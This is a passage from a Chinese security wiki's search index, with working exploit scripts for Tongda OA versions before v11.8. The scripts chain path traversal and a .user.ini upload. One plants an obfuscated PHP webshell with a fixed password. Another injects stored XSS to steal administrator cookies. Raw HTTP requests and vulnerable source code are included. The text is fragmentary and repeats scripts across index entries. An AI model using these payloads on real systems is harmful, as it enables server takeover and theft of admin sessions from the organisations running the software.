[0m' ) print ( '+ \\033 [36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20.user.ini\u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_2 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20.user.ini\u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/peiqi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCjw/cGhwIAplY2hvICJQZWlRaV9XaWtpIjsKJGZPZ1Q9Y3JlYXRlX2Z1bmN0aW9uKGJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoMTE0MTk1Lzk5Mykuc3RyX3JvdDEzKCdiJykuc3RyX3JvdDEzKCd6JykuY2hyKDcwOC02MDcpLGNocigweGM2MGUvMHgxZjYpLmJhc2U2NF9kZWNvZGUoJ2RnPT0nKS5zdHJfcm90MTMoJ24nKS5jaHIoMzkwLTI4MikuY2hyKDB4MWFlLTB4MTg2KS5jaHIoMHgzYWMtMHgzODgpLmNocigweGQ1NjEvMHgxZGIpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5iYXNlNjRfZGVjb2RlKCdiUT09JykuYmFzZTY0X2RlY29kZSgnWlE9PScpLnN0cl9yb3QxMygnKScpLmNocig3OTgtNzM5KSk7JGZPZ1QoYmFzZTY0X2RlY29kZSgnT1RNMk4nLidETTNPMCcuJ0JsZGtGJy4nc0tDUmYnLicnLnN0cl9yb3QxMygnSCcpLnN0cl9yb3QxMygnUicpLmNocig0MTM4Mi83MjYpLnN0cl9yb3QxMygnRycpLmJhc2U2NF9kZWNvZGUoJ1ZnPT0nKS4nJy4nJy5iYXNlNjRfZGVjb2RlKCdSZz09Jykuc3RyX3JvdDEzKCdnJykuc3RyX3JvdDEzKCdEJykuYmFzZTY0X2RlY29kZSgnV2c9PScpLmNocigyMzc1MS8yNzMpLicnLidsUmFWMCcuJ3BPekk0Jy4nTURrek0nLidURTcnLicnKSk7Pz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0K\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20 peiqi.log \u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_3 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20 peiqi.log \u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_3 ( target_url , Cookie ): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : Cookie , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/reportshop/workshop/report/attachment-remark/form.inc.php? \\033 [0m\" . format ( target_url )) if \"PeiQi_Wiki\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u5305\u542b PeiQi_Wiki \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u6210\u529f\u4e0a\u4f20\u8681\u5251\u6728\u9a6c \u5bc6\u7801\u4e3a: PeiQi \\n [o] webshell\u8def\u5f84: {} /general/reportshop/workshop/report/attachment-remark/form.inc.php? \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u4e0d\u5305\u542b PeiQi_Wiki \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) Cookie = \"PHPSESSID=ug4ip8ohugo61bmu399npplep5; USER_NAME_COOKIE=admin; OA_USER_ID=admin\" POC_1 ( target_url , Cookie )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABXSS%E6%BC%8F%E6%B4%9E/","text":"\u901a\u8fbeOA v11.8 \u540e\u53f0\u6587\u4ef6\u5305\u542b\u5b58\u50a8\u578bXSS\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u901a\u8fbeOA v11.8\u4ee5\u4e0b\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u63a5\u53e3\uff0c\u53ef\u4e0a\u4f20 .user.ini \u6587\u4ef6\u5305\u542b\u6709xss\u8bed\u53e5\u7684\u6587\u4ef6\uff0c\u4f7f\u7ba1\u7406\u5458\u540e\u53f0\u6587\u4ef6\u5747\u5305\u542bXSS\u8bed\u53e5\uff0c\u88ab\u653b\u51fb\u8005\u83b7\u53d6\u654f\u611f\u4fe1\u606f \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u901a\u8fbeOA < v11.8 \u73af\u5883\u642d\u5efa \u00b6 \u901a\u8fbeOA v11.6\u4e0b\u8f7d\u94fe\u63a5 \u4e0b\u8f7d\u5b8c\u6bd5\u70b9\u51fb\u5b89\u88c5\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8fd9\u91cc\u4f7f\u7528\u7684\u73af\u5883\u4e3a\u901a\u8fbe v11.6\u7248\u672c\uff0cv11.6\u7248\u672c\u4e2d\u7684\u6f0f\u6d1e\u5229\u7528\u8f83\u597d\uff0c\u5728 v11.7 \u540e\u7eed\u7248\u672c\u4e2d\u89c4\u5b9a\u4e86\u4e0a\u4f20\u8def\u5f84\uff0c\u5bfc\u81f4XSS\u5229\u7528\u4f1a\u6bd4\u8f83\u56f0\u96be \u51fa\u73b0\u6f0f\u6d1e\u7684\u6587\u4ef6\u4e3a webroot/general/hr/manage/staff_info/update.php <?php include_once \"inc/auth.inc.php\" ; include_once \"inc/utility_all.php\" ; include_once \"inc/utility_file.php\" ; include_once \"inc/utility_field.php\" ; include_once \"inc/utility_cache.php\" ; include_once \"general/system/log/annual_leave_log.php\" ; if ( strstr ( $BYNAME , \"/\" ) || strstr ( $BYNAME , \" \\\\ \" ) || strstr ( $BYNAME , \"..\" )) { Message ( _ ( \"\u9519\u8bef\" ), _ ( \"OA\u7528\u6237\u540d\u5305\u542b\u975e\u6cd5\u5b57\u7b26\uff01\" )); exit (); } include_once \"inc/header.inc.php\" ; echo \" \\r\\n <body class= \\\" bodycolor \\\" > \\r\\n \" ; echo \" \\r\\n <body class= \\\" bodycolor \\\" > \\r\\n \" ; $PHOTO_NAME0 = $_FILES [ \"ATTACHMENT\" ][ \"name\" ]; $ATTACHMENT = $_FILES [ \"ATTACHMENT\" ][ \"tmp_name\" ]; if ( $PHOTO_NAME0 != \"\" ) { $FULL_PATH = MYOA_ATTACH_PATH . \"hrms_pic\" ; if ( ! file_exists ( $FULL_PATH )) { @ mkdir ( $FULL_PATH , 448 ); } $PHOTO_NAME = $USER_ID . substr ( $PHOTO_NAME0 , strrpos ( $PHOTO_NAME0 , \".\" )); $FILENAME = MYOA_ATTACH_PATH . \"hrms_pic/\" . $PHOTO_NAME ; td_copy ( $ATTACHMENT , $FILENAME ); if ( file_exists ( $ATTACHMENT )) { unlink ( $ATTACHMENT ); } if ( ! file_exists ( $FILENAME )) { Message ( _ ( \"\u9644\u4ef6\u4e0a\u4f20\u5931\u8d25\" ), _ ( \"\u539f\u56e0\uff1a\u9644\u4ef6\u6587\u4ef6\u4e3a\u7a7a\u6216\u6587\u4ef6\u540d\u592a\u957f\uff0c\u6216\u9644\u4ef6\u5927\u4e8e30\u5146\u5b57\u8282\uff0c\u6216\u6587\u4ef6\u8def\u5f84\u4e0d\u5b58\u5728\uff01\" )); Button_Back (); exit (); } } \u5728\u8fd9\u91cc\u53c2\u6570 $USER_ID \u662f\u53ef\u63a7\u7684\uff0c\u5e76\u4e14\u65e0\u8fc7\u6ee4\u5371\u9669\u7b26\u53f7\u5c31\u62fc\u63a5\u8fdb\u53bb\u4e86\uff0c\u90a3\u6211\u4eec\u4f20\u5165 ../../../ \u6211\u4eec\u5c31\u53ef\u4ee5\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u4e86 \u7531\u4e8e\u901a\u8fbeOA \u7684\u6587\u4ef6\u4e0a\u4f20\u9650\u5236\u7684\u6b7b\u6b7b\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5229\u7528 PHP\u7684 .user.ini \u6587\u4ef6\u6765\u5305\u542b\u5176\u4ed6\u6587\u4ef6\uff0c\u8fd9\u91cc\u662f\u53ef\u4ee5\u7528\u4e8e\u5305\u542bXSS\u8bed\u53e5\u7684\u6587\u4ef6\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u4e0a\u4f20\u6587\u4ef6 \u5185\u5bb9\u4e3a auto_prepend_file=peiqi.log \u6211\u4eec\u60f3\u8981\u6700\u5927\u5316\u5229\u7528\u53ef\u4ee5\u4e0a\u4f20\u5728**\u9996\u9875\u6216\u8005\u7ba1\u7406\u5458** \u754c\u9762\uff0c\u5229\u7528\u81ea\u5b9a\u4e49\u5f39\u7a97\u6765\u6e17\u900f \u8fd9\u91cc\u5bf9\u7ba1\u7406\u5458\u9875\u9762 general \u76ee\u5f55\u4e0a\u4f20 \u8bf7\u6c42\u5305\u4e3a POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/.user HTTP/1.1 Host: 192.168.1.105 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104 Content-Length: 365 Connection: close Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31 Upgrade-Insecure-Requests: 1 -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"submit\" \u63d0\u4ea4 -----------------------------17518323986548992951984057104-- \u5176\u4e2d USER_ID=../../general/.user \u4e3a\u4e0a\u4f20\u8def\u5f84 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log \u8fd9\u91cc\u62fc\u63a5\u540e\u4e0a\u4f20\u5c31\u53d8\u6210\u4e86 .user.ini \u8fd9\u91cc\u518d\u4e0a\u4f20 XSS\u6587\u4ef6 peiqi.log \u88ab\u5305\u542b\u8fdb\u53bb \u4e0a\u4f20\u540e\u6bcf\u6b21\u7ba1\u7406\u5458\u767b\u5f55\u540e\u90fd\u4f1a\u5e26\u7740Cookie\u8bf7\u6c42\u4e00\u6b21XSS\u5e73\u53f0 \u9493\u9c7c\u4ec0\u4e48\u7684\u4ee3\u7801\u5199\u5728peiqi.log\u6587\u4ef6\u91cc\u5c31\u597d\u5566 \u521a\u521a\u63d0\u5230\u4e86 v11.7\u7248\u672c\u4e0d\u65b9\u4fbf\u5229\u7528\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728\u540e\u7eed\u7248\u672c\u52a0\u4e0a\u4e86\u6587\u4ef6\u4e0a\u4f20\u7684\u89c4\u5b9a\u8def\u5f84 if ((strpos($source, \"webroot\") !== false) && (strpos($source, \"attachment\") === false)) { return false; } else { return true; } \u8def\u5f84\u4e2d\u5fc5\u987b\u8981\u5305\u542b webroot \u548c attachment \u624d\u53ef\u4ee5\u4e0a\u4f20 \u8fd9\u91ccXSS\u7684\u5229\u7528\u70b9\u67094\u4e2a\u6587\u4ef6\u5939\uff0c\u5176\u4e2d\u6700\u6709\u51e0\u7387XSS\u7684\u4e3a**\u5b58\u50a8\u76ee\u5f55\u7ba1\u7406\u7684\u6587\u4ef6\u5939** \u7528\u540c\u6837\u7684\u65b9\u6cd5\u4e0a\u4f20\u5229\u7528\u6587\u4ef6\uff0c\u6bcf\u6b21\u5f53\u7ba1\u7406\u5458\u8bbe\u7f6e\u65f6\u5c31\u4f1a\u76d7\u53d6Cookie \u6f0f\u6d1e\u5229\u7528POC \u00b6 \u56e0\u4e3a\u662fxss\u53ef\u80fd\u5bf9\u76ee\u6807\u6709\u5f71\u54cd\uff0c\u6240\u4ee5\u8fd9\u91ccPOC\u5728\u4e00\u4e2a\u4e0d\u5e38\u7528\u76ee\u5f55\u63a2\u6d4b\u662f\u5426\u5b58\u5728\u6f0f\u6d1e Cookie\u586b\u5199\u8bbf\u95ee\u540e\u53f0\u65f6\u7684Cookie, \u5176\u4e2d\u7684base64\u89e3\u7801\u66f4\u6539 PeiQi_Wiki\u4e3a \u81ea\u5df1\u7684XSS\u8bed\u53e5 v11.6\u53ca\u4ee5\u4e0b \u653b\u51fb /general \u548c /general/system/attachment \u76ee\u5f55\u8f83\u597d v11.6\u4ee5\u4e0a \u653b\u51fb /general/system/attachment \u76ee\u5f55\u8f83\u597d import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u901a\u8fbeOA < V11.8 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20.user.ini\u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_2 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20.user.ini\u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/peiqi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KClBlaVFpX1dpa2kKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20 peiqi.log \u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_3 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20 peiqi.log \u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_3 ( target_url , Cookie ): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : Cookie , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi \\033 [0m\" . format ( target_url )) if \"PeiQi_Wiki\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u5305\u542b PeiQi_Wiki,\u5b58\u5728XSS\u6f0f\u6d1e, \u53ef\u53c2\u8003\u6587\u7ae0\u5199\u7684\u5229\u7528\u7248\u672c\u8fdb\u4e00\u6b65\u653b\u51fb \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u4e0d\u5305\u542b PeiQi_Wiki \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) Cookie = \"USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31\" POC_1 ( target_url , Cookie ) \u53c2\u8003\u6587\u7ae0 \u00b6 https://paper.seebug.org/1499/","title":"\u901a\u8fbeOA v11.8 \u6587\u4ef6\u5305\u542bXSS\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABXSS%E6%BC%8F%E6%B4%9E/#\u901a\u8fbeoa-v118-\u540e\u53f0\u6587\u4ef6\u5305\u542b\u5b58\u50a8\u578bxss\u6f0f\u6d1e","text":"","title":"\u901a\u8fbeOA v11.8 \u540e\u53f0\u6587\u4ef6\u5305\u542b\u5b58\u50a8\u578bXSS\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABXSS%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u901a\u8fbeOA v11.8\u4ee5\u4e0b\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u63a5\u53e3\uff0c\u53ef\u4e0a\u4f20 .user.ini \u6587\u4ef6\u5305\u542b\u6709xss\u8bed\u53e5\u7684\u6587\u4ef6\uff0c\u4f7f\u7ba1\u7406\u5458\u540e\u53f0\u6587\u4ef6\u5747\u5305\u542bXSS\u8bed\u53e5\uff0c\u88ab\u653b\u51fb\u8005\u83b7\u53d6\u654f\u611f\u4fe1\u606f","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABXSS%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u901a\u8fbeOA < v11.8","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABXSS%E6%BC%8F%E6%B4%9E/#\u73af\u5883\u642d\u5efa","text":"\u901a\u8fbeOA v11.6\u4e0b\u8f7d\u94fe\u63a5 